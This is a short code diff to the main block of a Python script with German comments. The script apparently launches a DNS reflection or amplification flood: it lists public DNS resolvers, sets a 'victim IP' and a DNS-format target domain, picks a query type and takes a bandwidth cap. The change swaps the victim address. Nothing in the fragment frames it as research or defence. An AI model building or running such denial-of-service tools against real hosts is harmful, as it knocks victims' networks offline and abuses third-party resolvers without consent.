@@ -121,7 +121,8 @@ def choose_query_type():
 # Beispielaufruf
 if __name__ == "__main__":
     resolver_list = ["8.8.8.8", "8.8.4.4"]  # Liste von DNS-Resolvern
-    victim_ip = "192.168.1.100"  # IP des Opfers
+    victim_ip = "192.168.1.100"
+    victim_ip = "192.168.0.1" # IP des Opfers
     target_domain = "\x07example\x03com"  # Domain im DNS-Format
     query_type = choose_query_type()
     max_bandwidth = int(input("Maximale Bandbreite (Bytes/s, 0 für unbegrenzt): ")) or None
